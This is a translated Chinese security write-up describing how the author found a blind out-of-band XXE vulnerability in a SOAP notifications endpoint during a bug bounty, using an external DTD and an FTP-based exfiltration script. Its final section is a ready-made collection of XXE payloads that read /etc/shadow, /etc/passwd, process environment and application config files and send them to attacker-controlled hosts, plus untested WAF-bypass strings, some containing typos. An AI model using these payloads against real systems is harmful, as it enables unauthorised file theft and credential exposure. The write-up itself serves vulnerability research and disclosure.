***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

 **今天，我要和大家分享的是，我在某个邀请漏洞测试项目中，发现Bind OOB
XXE漏洞的方法。由于涉及隐私，以下文章中涉及网站域名的部分我已作了编辑隐藏，敬请见谅。**

## 漏洞分析

首先，与大多数挖洞者的探测模式一样，我对目标网站进行了全方位的服务资产踩点识别，在此过程中，我发现了其中一个子域名网站比较有意思，于是，我就对它进行了目录遍历，然后，就发现了其名为/notifications的服务端。在BurpSuite中，对这个/notifications服务端的请求和响应如下图所示：

![利用BLIND OOB
XXE漏洞获取文件系统访问权限的测试](https://image.3001.net/images/20180331/15224809138499.png!small)

在其响应内容中，我注意到，除了有XML内容外，还包含了一个XML
SOAP语法体。由于没有GET参数可供测试，因此我决定向该/notifications服务端发送一个简单的，不指定任何内容类型（content-type）的POST请求进行探究，之后，在POST请求发出后，XML SOAP语法体不再出现，而且整个请求响应的代码为200：

![利用BLIND OOB
XXE漏洞获取文件系统访问权限的测试](https://image.3001.net/images/20180331/15224809431488.png!small)

看来，貌似该Web应用端对POST请求能做出很好的响应，且不会抛出405的请求方法错误，所以我又构造定义了包含content-type:
application/xml样式的XML语法内容，用它来作POST请求，看看响应如何：

![利用BLIND OOB
XXE漏洞获取文件系统访问权限的测试](https://image.3001.net/images/20180331/1522480960730.png!small)

虽然这次的POST响应还是XML内容，但却与上一次不同，这种响应表面上看似像服务端对GET请求的响应，而且，这次的响应内容中包含的标签值不是上次的“TestRequestCalled”，而是“OK”。接着，我又发送了一个定义的JSON请求（content-type: application/json），来测试服务端的具体响应：

![利用BLIND OOB
XXE漏洞获取文件系统访问权限的测试](https://image.3001.net/images/20180331/15224809851093.png!small)  

这一次，响应内容又是空的，和未指定任何内容类型的简单POST请求响应一样，由此，我推断该服务端能正常处理XML数据，这样一来，我想尝试利用BLIND
XXE攻击方式来触发其漏洞。我通过在自己VPS上架设了一个dtd文件，然后利用外部实体引用途径来测试其XML解析机制，幸运的是，最终部署在我VPS上的这个外部dtd文件实体被成功解析引用，以下是其请求内容和最后的解析结果：

![利用BLIND OOB
XXE漏洞获取文件系统访问权限的测试](https://image.3001.net/images/20180331/15224810055081.png!small)

## xxe-ftp-server.rb脚本应用

由于该系统使用了java框架，而俄罗斯OnSec实验室曾针对Java程序的XXE-OOB攻击作出了[相关研究](http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html)，并给出相应的payload，以及一个通过ftp服务读取系统目录的漏洞利用脚本[xxe-ftp-server.rb](https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb)，运行该脚本后，8088端口作为http服务端负责获取OOB攻击payload，而8077端口用于ftp连接服务，最终能成功读取到目标系统目录：

![利用BLIND OOB
XXE漏洞获取文件系统访问权限的测试](https://image.3001.net/images/20180331/1522481053799.png!small)

尽管最后该漏洞被确认为一个重复报，但我还是想把它分享出来，我自己也从中学到一些判断服务端应用的经验。

## 一些有用的XXE Payload

    
    
    --------------------------------------------------------------    Vanilla, used to verify outbound xxe or blind xxe
    --------------------------------------------------------------    <?xml version="1.0" ?>
    <!DOCTYPE r [
    <!ELEMENT r ANY >
    <!ENTITY sp SYSTEM "http://x.x.x.x:443/test.txt">
    ]>
    <r>&ampsp</r>
    ---------------------------------------------------------------    OoB extraction
    ---------------------------------------------------------------    <?xml version="1.0" ?>
    <!DOCTYPE r [
    <!ELEMENT r ANY >
    <!ENTITY % sp SYSTEM "http://x.x.x.x:443/ev.xml">
    %sp;
    %param1;
    ]>
    <r>&ampexfil</r>
    ## External dtd: ##
    <!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
    <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://x.x.x.x:443/?%data;'>">
    ----------------------------------------------------------------    OoB variation of above (seems to work better against .NET)
    ----------------------------------------------------------------    <?xml version="1.0" ?>
    <!DOCTYPE r [
    <!ELEMENT r ANY >
    <!ENTITY % sp SYSTEM "http://x.x.x.x:443/ev.xml">
    %sp;
    %param1;
    %exfil;
    ]>
    ## External dtd: ##
    <!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
    <!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM 'http://x.x.x.x:443/?%data;'>">
    ---------------------------------------------------------------    OoB extraction
    ---------------------------------------------------------------    <?xml version="1.0"?>
    <!DOCTYPE r [
    <!ENTITY % data3 SYSTEM "file:///etc/shadow">
    <!ENTITY % sp SYSTEM "http://EvilHost:port/sp.dtd">
    %sp;
    %param3;
    %exfil;
    ]>
    ## External dtd: ##
    <!ENTITY % param3 "<!ENTITY &#x25; exfil SYSTEM 'ftp://Evilhost:port/%data3;'>">
    -----------------------------------------------------------------------    OoB extra ERROR -- Java
    -----------------------------------------------------------------------    <?xml version="1.0"?>
    <!DOCTYPE r [
    <!ENTITY % data3 SYSTEM "file:///etc/passwd">
    <!ENTITY % sp SYSTEM "http://x.x.x.x:8080/ss5.dtd">
    %sp;
    %param3;
    %exfil;
    ]>
    <r></r>
    ## External dtd: ##
    <!ENTITY % param1 '<!ENTITY &#x25; external SYSTEM "file:///nothere/%payload;">'> %param1; %external;
    -----------------------------------------------------------------------    OoB extra nice
    -----------------------------------------------------------------------    <?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPE root [
     <!ENTITY % start "<![CDATA[">
     <!ENTITY % stuff SYSTEM "file:///usr/local/tomcat/webapps/customapp/WEB-INF/applicationContext.xml ">
    <!ENTITY % end "]]>">
    <!ENTITY % dtd SYSTEM "http://evil/evil.xml">
    %dtd;
    ]>
    <root>&ampall</root>
     
    ## External dtd: ##
     
    <!ENTITY all "%start;%stuff;%end;">
    ------------------------------------------------------------------    File-not-found exception based extraction
    ------------------------------------------------------------------    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE test [ 
      <!ENTITY % one SYSTEM "http://attacker.tld/dtd-part" >
      %one;
      %two;
      %four;
    ]>
    ## External dtd: ##
    <!ENTITY % three SYSTEM "file:///etc/passwd">
    <!ENTITY % two "<!ENTITY % four SYSTEM 'file:///%three;'>">
    -------------------------^ you might need to encode this % (depends on your target) as: &#x25;
    --------------    FTP
    --------------    <?xml version="1.0" ?>
    <!DOCTYPE a [
    <!ENTITY % asd SYSTEM "http://x.x.x.x:4444/ext.dtd">
    %asd;
    %c;
    ]>
    <a>&amprrr</a>
    ## External dtd ##
    <!ENTITY % d SYSTEM "file:///proc/self/environ">
    <!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://x.x.x.x:2121/%d;'>">
    ---------------------------    Inside SOAP body
    ---------------------------    <soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
    ---------------------------    Untested - WAF Bypass
    ---------------------------    <!DOCTYPE :. SYTEM "http://"
    <!DOCTYPE :_-_: SYTEM "http://"
    <!DOCTYPE {0xdfbf} SYSTEM "http://"

 ***参考来源：[hawkinsecurity](https://hawkinsecurity.com/2017/12/13/rce-via-spring-engine-ssti/)，FreeBuf小编clouds编译，转载请注明来自FreeBuf.COM**  

